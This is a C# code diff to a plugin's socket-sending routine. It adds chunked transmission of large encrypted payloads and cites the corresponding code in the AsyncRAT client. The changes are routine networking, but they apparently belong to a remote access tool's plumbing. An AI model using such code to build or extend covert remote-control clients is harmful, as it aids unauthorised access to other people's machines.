@@ -2,7 +2,9 @@
 using PacketLib.Utils;
 using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Net.Sockets;
+using System.Windows.Forms;
 
 /* 
 || AUTHOR Arsium ||
@@ -71,6 +73,30 @@ namespace Plugin
             if (Connected)
                 sendDataAsync.BeginInvoke(packet, new AsyncCallback(SendDataCompleted), null);
         }
+
+        /*
+            https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp/blob/master/AsyncRAT-C%23/Client/Connection/ClientSocket.cs
+            Lines 228 - 243
+            
+                    if (buffer.Length > 1000000) //1mb
+                    {
+                        Debug.WriteLine("send chunks");
+                        using (MemoryStream memoryStream = new MemoryStream(buffer))
+                        {
+                            int read = 0;
+                            memoryStream.Position = 0;
+                            byte[] chunk = new byte[50 * 1000];
+                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
+                            {
+                                TcpClient.Poll(-1, SelectMode.SelectWrite);
+                                SslClient.Write(chunk, 0, read);
+                                SslClient.Flush();
+                                lock (Settings.LockReceivedSendValue)
+                                    Settings.SentValue += read;
+                            }
+                        }
+                    }
+         */
         private int SendData(IPacket data)
         {
             try
@@ -94,21 +120,38 @@ namespace Plugin
 
                     int sent = socket.Send(header);
 
-                    while (total < size)
+                    if (size > 1000000) 
                     {
-                        sent = socket.Send(encryptedData, total, size, SocketFlags.None);
-                        total += sent;
-                        datalft -= sent;
+                        using (MemoryStream memoryStream = new MemoryStream(encryptedData)) 
+                        {
+                            int read = 0;
+                            memoryStream.Position = 0;
+                            byte[] chunk = new byte[50 * 1000];
+                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
+                            {
+                                socket.Send(chunk, 0, read, SocketFlags.None);
+                            }
+                        }
+                    }
+                    else
+                    {
+                        while (total < size)
+                        {
+                            sent = socket.Send(encryptedData, total, size, SocketFlags.None);
+                            total += sent;
+                            datalft -= sent;
+                        }
                     }
                     return size;
                 }
             }
-            catch (Exception)
+            catch (Exception ex)
             {
                 Connected = false;
                 return 0;
             }
         }
+
         private void SendDataCompleted(IAsyncResult ar)
         {
             int size = sendDataAsync.EndInvoke(ar);
